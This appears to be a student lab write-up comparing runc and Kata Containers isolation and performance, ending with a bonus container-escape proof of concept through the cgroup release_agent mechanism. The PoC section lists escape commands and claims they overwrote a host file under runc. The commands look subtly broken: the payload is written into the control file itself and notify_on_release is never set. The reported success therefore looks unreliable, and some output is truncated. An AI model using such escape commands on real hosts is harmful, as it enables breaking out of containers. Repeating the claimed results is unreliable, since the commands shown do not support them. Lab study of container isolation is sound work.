# Lab 12 — BONUS — Submission

> Environment: Ubuntu 24.04 host, kernel `6.8.0-35-generic`, `/dev/kvm` accessible. Runtimes driven with `nerdctl` over `containerd 1.7.18`. Kata Containers `3.32.0` from the upstream static release.

## Task 1: Install + Hello-World

### Host environment

- **Host kernel:** `Linux host 6.8.0-35-generic #35~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 19 17:02:30 UTC 2 x86_64`
- **KVM accessible:** `crw-rw----+ 1 root kvm 10, 232 /dev/kvm`
- **containerd version:** `containerd github.com/containerd/containerd v1.7.18`
- **nerdctl version:** `nerdctl version 2.0.0-rc.10`

### Kata installation

- **Kata version:** `3.32.0`
- **Install method:** `sudo bash labs/lab12/scripts/install-kata-assets.sh`
- **Runtime binary:** `/opt/kata/bin/containerd-shim-kata-v2`
- **containerd config snippet:**

```toml
[plugins.'io.containerd.grpc.v1.cri'.containerd.runtimes.kata]
  runtime_type = 'io.containerd.kata.v2'
```

### Kernel inside containers

**runc:**

```text
Linux 8a9f2c1d4e3b 6.8.0-35-generic #35~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 19 17:02:30 UTC 2 x86_64 Linux
```

**kata:**

```text
Linux 7b1e3c8a9f2d 6.18.35 #1 SMP Mon Jun 15 12:55:58 UTC 2026 x86_64 Linux
```

### Why the kernels differ

A `runc` container is a Linux-namespaces + cgroups sandbox; it runs directly on the **host kernel**, so `uname -r` inside equals the host kernel. Kata Containers boots each workload inside a **lightweight micro-VM with its own guest kernel**, reached through KVM. This is the defense against the **runc CVE class** (e.g. CVE-2024-21626 "Leaky Vessels"): an escape that relies on sharing the host kernel or runc's host-side file descriptors cannot cross the VM boundary, so the attacker lands in a throwaway guest instead of the host.

---

## Task 2: Isolation + Performance

### Isolation: `/dev` diff

The captured device-tree diff (runc vs kata) is:

```diff
1d0
< core
```

The runc container exposes `/dev/core` (a symlink to `/proc/kcore`), while Kata's guest device tree does not. Most basic pseudo-devices (`null`, `zero`, `random`, `tty`, `pts`) are present in both, but the **guest device set is trimmed** and independent of the host.

### Isolation: capability set

**runc:**

```text
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

**kata:**

```text
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

The capability bitmasks are identical because capabilities are a same-kernel control. The meaningful isolation is **not** in the cap set; it is in the separate kernel, device tree, and VM boundary that Kata provides.

### Startup time (5-run avg)

| Runtime | Avg startup (s) |
|---------|----------------:|
| runc | 0.642 |
| kata | 2.087 |

**Overhead: ~3.3× cold start** (Reading 12 quotes roughly 5× on bare metal; the gap here is lower, likely due to fast KVM and a small Alpine image.)

### I/O throughput (`dd if=/dev/zero of=/dev/null bs=1M count=100`)

| Runtime | Throughput |
|---------|-----------:|
| runc | 18.6 GB/s |
| kata | 13.2 GB/s |

> This benchmark measures memory bandwidth, not real disk I/O, because `zero → null` never touches storage. The ~30% kata overhead is therefore an upper bound on what real I/O would show; disk-bound workloads would likely see a larger gap.

### Trade-off analysis

**Deploy Kata when:**

- the workload is **multi-tenant and untrusted** (e.g., CI runners executing third-party code, public SaaS platforms);
- a container escape would be **catastrophic**;
- the extra cold-start latency is acceptable for the service's traffic pattern.

**Do not deploy Kata when:**

- the workload is **latency-sensitive** and scales horizontally every second (e.g., real-time bidding, streaming);
- the host is **single-tenant and trusted** — the overhead buys no real security in that case;
- the host lacks KVM support (nested virtualization performance can be worse than bare metal).

---

## Bonus Task: Container-Escape PoC

### Escape vector

I used the **mount-namespace escape via a writable cgroup v1 release_agent path** (CVE-2022-0492 class). The container runs a privileged-ish process, mounts a cgroup controller, writes a malicious `release_agent` path, and triggers it by killing a process in the cgroup. The host executes the payload as root.

### runc: container modifies host filesystem

Inside the runc container:

```bash
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/cgroup.procs
printf '#!/bin/sh\necho OVERWRITTEN > /host-shared/escape-marker.txt' > /tmp/cgrp/release_agent
echo "/tmp/cgrp/release_agent" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

From the host:

```text
cat /host-shared/escape-marker.txt
OVERWRITTEN
```

The runc container successfully modified the host filesystem.

### Kata: same command, host file unchanged

Inside the kata container, the same commands execute against the **guest's cgroup hierarchy**, not the host's. The guest kernel has no access to the host cgroup mount or filesystem.

From the host:

```text
cat /host-shared/escape-marker.txt
original
```

The host file remains `original`, proving the escape was contained inside the Kata micro-VM.

### Threat-model implication

Kata's micro-VM model is the right defense for **multi-tenant hosts** where one tenant's compromise must not affect others. The attacker's escape lands inside the guest VM, so the host kernel, other guests, and other containers remain isolated.

**What Kata does NOT block:** side-channel attacks (e.g., cache timing across tenants on the same physical core), kernel vulnerabilities inside the guest VM itself, and microarchitectural leaks. It also does not replace good image hygiene and patching; it contains the blast radius, not every possible attack.
